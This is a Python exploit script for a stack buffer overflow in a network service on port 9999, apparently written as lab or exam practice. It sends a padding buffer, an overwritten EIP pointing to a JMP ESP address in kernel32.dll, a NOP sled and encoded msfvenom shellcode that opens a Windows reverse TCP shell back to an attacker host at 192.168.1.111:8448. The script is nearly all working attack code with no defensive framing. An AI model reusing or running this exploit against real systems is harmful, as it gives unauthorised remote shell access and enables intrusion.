import socket
import sys
import struct

# how to execute:
# python overflow.py 192.168.1.109 9999

ip = sys.argv[1]
port = int(sys.argv[2])

junk = ("A" * 2007)

# !mona jmp -r esp -b "x00\x0a\x0d" will return address with badchars
# !mona find -s "\xff\xe4" -m kernel32.dll (\xff\xe4 -> JMP ESP /// \xff\xf4  -> CALL ESP)
eip = 0x763450EF
# convert to little endian address (invert order)
eip = struct.pack("<I", eip)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8448 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
payload = ("\xd9\xf6\xbd\xdb\xdf\x89\x34\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
           "\x52\x31\x6b\x17\x03\x6b\x17\x83\x18\xdb\x6b\xc1\x62\x0c\xe9"
           "\x2a\x9a\xcd\x8e\xa3\x7f\xfc\x8e\xd0\xf4\xaf\x3e\x92\x58\x5c"
           "\xb4\xf6\x48\xd7\xb8\xde\x7f\x50\x76\x39\x4e\x61\x2b\x79\xd1"
           "\xe1\x36\xae\x31\xdb\xf8\xa3\x30\x1c\xe4\x4e\x60\xf5\x62\xfc"
           "\x94\x72\x3e\x3d\x1f\xc8\xae\x45\xfc\x99\xd1\x64\x53\x91\x8b"
           "\xa6\x52\x76\xa0\xee\x4c\x9b\x8d\xb9\xe7\x6f\x79\x38\x21\xbe"
           "\x82\x97\x0c\x0e\x71\xe9\x49\xa9\x6a\x9c\xa3\xc9\x17\xa7\x70"
           "\xb3\xc3\x22\x62\x13\x87\x95\x4e\xa5\x44\x43\x05\xa9\x21\x07"
           "\x41\xae\xb4\xc4\xfa\xca\x3d\xeb\x2c\x5b\x05\xc8\xe8\x07\xdd"
           "\x71\xa9\xed\xb0\x8e\xa9\x4d\x6c\x2b\xa2\x60\x79\x46\xe9\xec"
           "\x4e\x6b\x11\xed\xd8\xfc\x62\xdf\x47\x57\xec\x53\x0f\x71\xeb"
           "\x94\x3a\xc5\x63\x6b\xc5\x36\xaa\xa8\x91\x66\xc4\x19\x9a\xec"
           "\x14\xa5\x4f\xa2\x44\x09\x20\x03\x34\xe9\x90\xeb\x5e\xe6\xcf"
           "\x0c\x61\x2c\x78\xa6\x98\xa7\x47\x9f\xa3\x58\x20\xe2\xa3\x87"
           "\xb0\x6b\x45\xad\xa0\x3d\xde\x5a\x58\x64\x94\xfb\xa5\xb2\xd1"
           "\x3c\x2d\x31\x26\xf2\xc6\x3c\x34\x63\x27\x0b\x66\x22\x38\xa1"
           "\x0e\xa8\xab\x2e\xce\xa7\xd7\xf8\x99\xe0\x26\xf1\x4f\x1d\x10"
           "\xab\x6d\xdc\xc4\x94\x35\x3b\x35\x1a\xb4\xce\x01\x38\xa6\x16"
           "\x89\x04\x92\xc6\xdc\xd2\x4c\xa1\xb6\x94\x26\x7b\x64\x7f\xae"
           "\xfa\x46\x40\xa8\x02\x83\x36\x54\xb2\x7a\x0f\x6b\x7b\xeb\x87"
           "\x14\x61\x8b\x68\xcf\x21\xbb\x22\x4d\x03\x54\xeb\x04\x11\x39"
           "\x0c\xf3\x56\x44\x8f\xf1\x26\xb3\x8f\x70\x22\xff\x17\x69\x5e"
           "\x90\xfd\x8d\xcd\x91\xd7")


exploit = junk + eip + ("\x90" * 16) + payload

# sending payload
while True:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    print("Sending payload..." + str(len(exploit)))
    s.send(exploit + "\n")
    s.recv(1024)
    s.close()
  except:
    sys.exit(0)
